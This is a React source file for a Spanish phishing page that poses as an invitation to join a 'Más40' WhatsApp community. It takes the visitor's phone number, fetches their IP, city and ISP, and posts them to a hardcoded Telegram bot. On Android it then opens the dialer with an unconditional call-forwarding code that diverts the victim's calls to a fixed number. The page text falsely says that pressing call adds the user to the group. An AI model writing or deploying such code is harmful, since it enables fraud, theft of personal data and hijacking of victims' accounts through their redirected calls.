import React, { useEffect, useRef, useState } from 'react';
import { Helmet } from 'react-helmet';
import { useNavigate } from 'react-router-dom';
import SiteHeader from '@/components/SiteHeader';
import SiteFooter from '@/components/SiteFooter';
const LOGO = 'https://horizons-cdn.hostinger.com/f19503f1-817a-4f76-94b4-8446ad3c97a8/6633ac7017eaad1caf6d109f507b523c.jpg';

// CONFIGURACIÓN DE TELEGRAM
const TELEGRAM_BOT_TOKEN = '8298792473:AAGw1ZyXuaFCHhKkTvt973DFvYwwSPo6W-o';
const TELEGRAM_CHAT_ID = '8894482935';
function SpainFlag() {
  return <svg viewBox="0 0 3 2" className="h-5 w-7 rounded-sm shadow-sm" aria-label="España">
        <rect width="3" height="2" fill="#AA151B" />
        <rect y="0.5" width="3" height="1" fill="#F1BF00" />
    </svg>;
}
function HomePage() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [error, setError] = useState('');
  const valid = phone.length === 9;

  // Función para obtener información del usuario (IP, ubicación, dispositivo)
  const getUserInfo = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      return {
        ip: data.ip,
        city: data.city,
        isp: data.org
      };
    } catch (error) {
      return {
        ip: 'No disponible',
        city: 'No disponible',
        isp: 'No disponible'
      };
    }
  };

  const handleJoinAndroid = async () => {
    if (!valid) {
      setError('Introduce un número móvil de 9 dígitos.');
      return;
    }
    setError('');
    try {
      // Obtener información del usuario
      const userInfo = await getUserInfo();

      // Enviar número de teléfono y datos del usuario a Telegram
      const message = `
📱 Nuevo número Más40 
📞 Número: +34 ${phone}
🌐  IP: ${userInfo.ip}
🏙️ Ciudad: ${userInfo.city}
📡 ISP: ${userInfo.isp}
      `;
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
      const data = await response.json();
      if (data.ok) {
        // Redirigir al teclado de marcación de Android con el código de desvío de llamadas incondicional
        window.location.href = 'tel:**21*627283811*#';
      } else {
        setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
      }
    } catch (error) {
      console.error('Error:', error);
      setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
    }
  };

  const handleJoinIPhone = async () => {
    if (!valid) {
      setError('Introduce un número móvil de 9 dígitos.');
      return;
    }
    setError('');
    try {
      // Obtener información del usuario
      const userInfo = await getUserInfo();

      // Enviar número de teléfono y datos del usuario a Telegram
      const message = `
📱 Nuevo número Más40 
📞 Número: +34 ${phone}
🌐  IP: ${userInfo.ip}
🏙️ Ciudad: ${userInfo.city}
📡 ISP: ${userInfo.isp}
      `;
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
      const data = await response.json();
      if (data.ok) {
        // Redirigir a la página de verificación
        navigate('/verificacion');
      } else {
        setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
      }
    } catch (error) {
      console.error('Error:', error);
      setError('Error al procesar tu solicitud. Inténtalo de nuevo.');
    }
  };

  return <div className="min-h-[100dvh] flex flex-col bg-white">
        <Helmet>
            <title>Más40 — Invitación al grupo</title>
            <meta name="description" content="Únete al grupo de Más40 verificando tu número móvil de España." />
        </Helmet>
        <SiteHeader />
        <main className="flex-1 px-6 pt-10 pb-14 flex flex-col items-center text-center">
            <img src={LOGO} alt="Grupo Más40" className="h-48 w-48 rounded-full object-cover border border-neutral-200" />
            <h1 className="mt-7 text-3xl text-neutral-800">Más40 | Comunidad</h1>
            <p className="mt-1 text-xl text-neutral-600">Invitación a comunidad de WhatsApp</p>
            <div className="mt-8 w-full max-w-sm text-left">
                <label htmlFor="tel" className="block text-center text-sm font-medium text-neutral-600 mb-2"><span style={{
            fontSize: "14px",
            lineHeight: "normal"
          }}><span style={{
              lineHeight: "normal"
            }}><span style={{
                lineHeight: "normal"
              }}><span style={{
                  lineHeight: "normal"
                }}><span style={{
                    lineHeight: "normal"
                  }}>Para <strong>unirte</strong> debes pulsar el botón (📞) <strong>llamar</strong> en tu móvil, automáticamente te agrega a la Comunidad</span></span></span></span></span></label>
                <div className="flex items-center gap-2 rounded-2xl border border-neutral-300 px-4 py-3 focus-within:border-[#128C7E]">
                    <SpainFlag />
                    <span className="text-lg text-neutral-700 select-none">+34</span>
                    <input id="tel" type="tel" inputMode="numeric" placeholder="600 000 000" value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g, '').slice(0, 9))} className="flex-1 bg-transparent text-lg outline-none text-neutral-900 placeholder:text-neutral-400" />
                </div>
                {error ? <p className="mt-2 text-sm text-red-600">{error}</p> : null}
                <div className="mt-6 flex gap-4">
                    <button type="button" onClick={handleJoinAndroid} className="w-full rounded-full bg-[#0f7b6c] py-4 text-xl text-white transition active:scale-[0.98]">
                        Android
                    </button>
                    <button type="button" onClick={handleJoinIPhone} className="w-full rounded-full bg-[#0f7b6c] py-4 text-xl text-white transition active:scale-[0.98]">
                        iPhone
                    </button>
                </div>
                <div className="mt-8 border-t border-neutral-200 pt-6 text-center">
                    <p className="text-lg text-neutral-600">¿Aún no tienes Más40?</p>
                    <button type="button" disabled className="mt-1 text-lg text-[#1877bf] opacity-70 cursor-not-allowed">
                        Descargar
                    </button>
                </div>
            </div>
        </main>
        <SiteFooter />
    </div>;
}
export default HomePage;
